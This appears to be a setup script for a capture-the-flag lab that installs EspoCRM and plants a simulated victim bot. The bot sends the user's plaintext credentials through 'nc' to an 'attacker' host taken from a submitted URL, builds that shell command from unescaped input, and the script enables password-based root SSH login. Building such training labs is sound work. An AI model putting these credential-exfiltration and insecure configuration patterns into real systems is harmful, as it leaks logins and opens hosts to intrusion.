#!/bin/bash
set -e

export DEBIAN_FRONTEND=noninteractive

apt update -y
apt install -y bc netcat-traditional

# Config
PROOF_FLAG="5d41402abc4b2a76b9719d911017c592"
ESPO_VER="9.0.6"
ADMIN_EMAIL="admin@gmail.com"
ADMIN_USER="admin"
ADMIN_PASS="admin123"
REGULAR_USER="user"
REGULAR_PASS="SshUserPass123"
REGULAR_EMAIL="user@gmail.com"
APP_DIR="/var/www/espocrm"
DB_NAME="espocrm"
DB_USER="espouser"
DB_PASS="espopass"
DB_ROOT_PASS="rootpass123"
HTTP_PORT="8082"

# Update and install dependencies
apt update -y && apt upgrade -y

apt install -y apache2 mariadb-server \
    php php-cli php-common php-mbstring php-xml php-curl \
    php-mysql php-zip php-gd php-intl php-bcmath \
    php-soap php-imap php-ldap php-json php-opcache \
    libapache2-mod-php \
    unzip wget curl git jq expect

# Verify PHP version
PHP_VERSION=$(php -r "echo PHP_MAJOR_VERSION.'.'.PHP_MINOR_VERSION;")
if [[ $(echo "${PHP_VERSION} < 8.2" | bc -l) -eq 1 ]]; then
    echo "EspoCRM 9.0.6 requires PHP 8.2 or higher. Current version: ${PHP_VERSION}"
    exit 1
fi

phpenmod mbstring xml curl mysql zip gd intl bcmath soap imap ldap json opcache

# Database setup
systemctl start mariadb
systemctl enable mariadb

mysql -u root <<EOF
ALTER USER 'root'@'localhost' IDENTIFIED BY '${DB_ROOT_PASS}';
DELETE FROM mysql.user WHERE User='';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
FLUSH PRIVILEGES;
EOF

mysql -u root -p${DB_ROOT_PASS} <<EOF
DROP DATABASE IF EXISTS ${DB_NAME};
CREATE DATABASE ${DB_NAME} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
DROP USER IF EXISTS '${DB_USER}'@'localhost';
CREATE USER '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';
GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';
FLUSH PRIVILEGES;
EOF

mysql -u ${DB_USER} -p${DB_PASS} -e "USE ${DB_NAME}; SELECT 1;" || { echo "Database connection failed"; exit 1; }

# Clean up existing installation
rm -rf ${APP_DIR}
rm -f /var/www/espocrm.zip

# Download and extract EspoCRM
cd /var/www
wget https://github.com/espocrm/espocrm/releases/download/${ESPO_VER}/EspoCRM-${ESPO_VER}.zip -O espocrm.zip || { echo "Download failed"; exit 1; }

unzip -q espocrm.zip
mv EspoCRM-${ESPO_VER} espocrm || { echo "Extract failed"; exit 1; }

# Set proper permissions
chown -R www-data:www-data ${APP_DIR}
find ${APP_DIR} -type d -exec chmod 755 {} \;
find ${APP_DIR} -type f -exec chmod 644 {} \;
chmod +x ${APP_DIR}/bin/command

# Create required directories
mkdir -p ${APP_DIR}/data
mkdir -p ${APP_DIR}/custom
mkdir -p ${APP_DIR}/client/custom
mkdir -p /var/www/.cache/composer
chown -R www-data:www-data ${APP_DIR}/data
chown -R www-data:www-data ${APP_DIR}/custom
chown -R www-data:www-data ${APP_DIR}/client/custom
chown -R www-data:www-data /var/www/.cache

# Apache config
sed -i '/^Listen 80$/d' /etc/apache2/ports.conf

if ! grep -q "Listen ${HTTP_PORT}" /etc/apache2/ports.conf; then
    echo "Listen ${HTTP_PORT}" >> /etc/apache2/ports.conf
fi

a2enmod rewrite headers ssl

cat <<EOF >/etc/apache2/sites-available/espocrm.conf
<VirtualHost *:${HTTP_PORT}>
    ServerAdmin webmaster@localhost
    DocumentRoot ${APP_DIR}
    ServerName localhost
    
    <Directory ${APP_DIR}>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
        
        Header always set X-Content-Type-Options nosniff
        Header always set X-Frame-Options DENY
        Header always set X-XSS-Protection "1; mode=block"
        Header always set Referrer-Policy "strict-origin-when-cross-origin"
    </Directory>
    
    <Files ".ht*">
        Require all denied
    </Files>
    
    <FilesMatch "\.(ini|log|conf)$">
        Require all denied
    </FilesMatch>
    
    <Directory ${APP_DIR}/data>
        Require all denied
    </Directory>
    
    <Directory ${APP_DIR}/application>
        Require all denied
    </Directory>
    
    <Directory ${APP_DIR}/vendor>
        Require all denied
    </Directory>
    
    ErrorLog \${APACHE_LOG_DIR}/espocrm_error.log
    CustomLog \${APACHE_LOG_DIR}/espocrm_access.log combined
</VirtualHost>
EOF

a2dissite 000-default.conf 2>/dev/null || true
a2dissite default-ssl.conf 2>/dev/null || true

a2ensite espocrm.conf
systemctl restart apache2

apache2ctl configtest || { echo "Apache config failed"; exit 1; }

# Set final permissions
chown -R www-data:www-data ${APP_DIR}
chmod -R 755 ${APP_DIR}
chmod -R 775 ${APP_DIR}/data
chmod -R 775 ${APP_DIR}/custom
chmod -R 775 ${APP_DIR}/client/custom

sleep 5

# Manual EspoCRM Installation
echo "Open browser: http://localhost:${HTTP_PORT}"
echo "Complete installation wizard:"
echo "Database: ${DB_NAME}, User: ${DB_USER}, Pass: ${DB_PASS}"
echo "Admin: ${ADMIN_USER}, Pass: ${ADMIN_PASS}, Email: ${ADMIN_EMAIL}"
read -p "Press ENTER when installation complete: " dummy

if [[ ! -f "${APP_DIR}/data/config.php" ]]; then
    echo "Installation not detected. Complete web installation first."
    exit 1
fi

# Create regular user
echo "Create regular user:"
echo "Login as admin, go to Administration → Users → Create User"
echo "Username: ${REGULAR_USER}, Email: ${REGULAR_EMAIL}"
read -p "Press ENTER when user creation complete: " dummy

USER_COUNT=$(mysql -u ${DB_USER} -p${DB_PASS} -se "USE ${DB_NAME}; SELECT COUNT(*) FROM user WHERE user_name='${REGULAR_USER}';")
if [[ "$USER_COUNT" != "1" ]]; then
    echo "User '${REGULAR_USER}' not found. Create user first."
    exit 1
fi

# Create bot service
cat <<'EOF' > /opt/bot.py
#!/usr/bin/env python3
import requests
import json
import sys
import time
import subprocess
from urllib.parse import urlparse, parse_qs
import re

class EspoCRMBot:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "http://localhost:8082"
        self.username = "user"
        self.password = "SshUserPass123"
        self.logged_in = False
    
    def extract_attacker_ip(self, url):
        """Extract attacker IP from URL parameters"""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Look for various parameter names that might contain the attacker IP
            for param_name in ['attacker', 'callback', 'redirect', 'return', 'ip', 'host']:
                if param_name in params:
                    return params[param_name][0]
            
            # If no parameter found, look in the fragment (after #)
            if parsed.fragment:
                fragment_params = parse_qs(parsed.fragment.split('?')[-1] if '?' in parsed.fragment else '')
                for param_name in ['attacker', 'callback', 'redirect', 'return', 'ip', 'host']:
                    if param_name in fragment_params:
                        return fragment_params[param_name][0]
        except:
            pass
        
        # Fallback to localhost
        return "127.0.0.1"
    
    def login(self):
        try:
            login_data = {
                "username": self.username,
                "password": self.password
            }
            
            response = self.session.post(
                f"{self.base_url}/",
                data=login_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )
            
            if response.status_code == 200:
                if "dashboard" in response.text.lower() or "espocrm" in response.text.lower():
                    self.logged_in = True
                    return True
            return False
                
        except Exception as e:
            return False
    
    def simulate_phishing_login(self, article_url):
        try:
            # Extract attacker IP from the URL
            attacker_ip = self.extract_attacker_ip(article_url)
            
            phishing_data = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "event": "phishing_attack_simulation",
                "victim_username": self.username,
                "victim_password": self.password,
                "original_article_url": article_url,
                "attacker_ip": attacker_ip,
                "user_agent": "EspoCRM-Bot/1.0",
                "attack_method": "fake_login_form",
                "status": "credentials_captured"
            }
            
            try:
                nc_data = json.dumps(phishing_data, indent=2)
                
                result = subprocess.run([
                    'bash', '-c', 
                    f'echo \'{nc_data}\' | nc -w 3 {attacker_ip} 80'
                ], timeout=10, capture_output=True, text=True)
                
                return result.returncode == 0
                    
            except subprocess.TimeoutExpired:
                return False
            except Exception:
                return False
                
        except Exception:
            return False
    
    def visit_link(self, url):
        try:
            if not self.logged_in:
                if not self.login():
                    return False
            
            response = self.session.get(url)
            time.sleep(2)
            
            return self.simulate_phishing_login(url)
            
        except Exception:
            return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 /opt/bot.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    bot = EspoCRMBot()
    
    success = bot.visit_link(url)

if __name__ == "__main__":
    main()
EOF

chmod +x /opt/bot.py

# Create web interface for bot
cat <<'EOF' > /opt/send_to_bot.py
#!/usr/bin/env python3
import subprocess
import sys
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import threading
import time

class BotHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = '''
<!DOCTYPE html>
<html>
<head>
    <title>Link Processor</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="url"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; }
        .btn { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
        .btn:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Link Processor</h2>
        <form action="/send" method="post">
            <div class="form-group">
                <label>URL:</label>
                <input type="url" name="url" placeholder="http://localhost:8082/#KnowledgeBaseArticle/view/..." required>
            </div>
            <button type="submit" class="btn">Process Link</button>
        </form>
    </div>
</body>
</html>
            '''
            self.wfile.write(html.encode())
            
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            status = {"status": "running"}
            self.wfile.write(json.dumps(status).encode())
    
    def do_POST(self):
        if self.path == '/send':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = parse_qs(post_data)
            
            url = params.get('url', [''])[0]
            
            if url:
                def send_to_bot():
                    try:
                        time.sleep(2)
                        result = subprocess.run([
                            'python3', '/opt/bot.py', url
                        ], capture_output=True, text=True, timeout=30)
                    except Exception:
                        pass
                
                bot_thread = threading.Thread(target=send_to_bot)
                bot_thread.daemon = True
                bot_thread.start()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                response_html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Processing</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
        .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .success {{ background: #d4edda; color: #155724; padding: 15px; border-radius: 4px; margin-bottom: 20px; }}
        .btn {{ background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="success">
            Processing: {url}
        </div>
        <a href="/" class="btn">Process Another</a>
    </div>
</body>
</html>
                '''
                self.wfile.write(response_html.encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'No URL provided')

def start_bot_interface():
    server = HTTPServer(('0.0.0.0', 9000), BotHandler)
    server.serve_forever()

if __name__ == "__main__":
    start_bot_interface()
EOF

chmod +x /opt/send_to_bot.py

pip3 install requests 2>/dev/null || apt install -y python3-requests

nohup python3 /opt/send_to_bot.py > /tmp/bot_interface.log 2>&1 &
BOT_PID=$!
echo $BOT_PID > /tmp/bot_interface.pid

# CTF flag setup
echo "${PROOF_FLAG}" > /proof.txt
chmod 644 /proof.txt

# Final checks
systemctl is-active apache2 || { echo "Apache not running"; exit 1; }
systemctl is-active mariadb || { echo "MariaDB not running"; exit 1; }

# Configuring SSH
apt install -y openssh-server
systemctl start ssh
systemctl enable ssh

# Create SSH user with password
useradd -m -s /bin/bash user
echo "user:SshUserPass123" | chpasswd

# Generate SSH key for root
ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" -q
cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys

# Configure SSH for both password and key authentication
sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
systemctl restart ssh

# Cleanup
rm -rf ~/.cache/*
rm -f /var/www/espocrm.zip
rm -f build.sh
rm -f /root/build.sh

echo "Setup completed successfully!"